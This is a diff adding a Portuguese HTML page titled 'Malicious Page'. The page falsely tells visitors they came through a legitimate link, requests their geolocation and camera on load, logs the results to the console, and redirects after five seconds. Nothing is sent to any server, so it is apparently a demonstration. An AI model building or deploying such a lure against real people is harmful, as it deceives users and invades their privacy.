@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Maliciosa</title>
+</head>
+<body>
+    <h1>Bem-vindo à nossa página!</h1>
+    <p>Você foi redirecionado aqui por um link legítimo.</p>
+
+    <script>
+        function coletarLocalizacao() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    console.log("Latitude: " + position.coords.latitude);
+                    console.log("Longitude: " + position.coords.longitude);
+                }, function(error) {
+                    console.log("Erro ao obter a localização", error);
+                });
+            } else {
+                console.log("Geolocalização não é suportada neste navegador.");
+            }
+        }
+
+        function acessarCamera() {
+            if (navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        console.log("Câmera acessada com sucesso!");
+                    })
+                    .catch(function(err) {
+                        console.log("Erro ao acessar a câmera: " + err);
+                    });
+            } else {
+                console.log("Câmera não é suportada neste navegador.");
+            }
+        }
+
+        function redirecionar() {
+            window.location.href = "https://www.site-legitimo.com";
+        }
+
+        window.onload = function() {
+            coletarLocalizacao();
+            acessarCamera();
+            setTimeout(redirecionar, 5000);
+        }
+    </script>
+</body>
+</html>
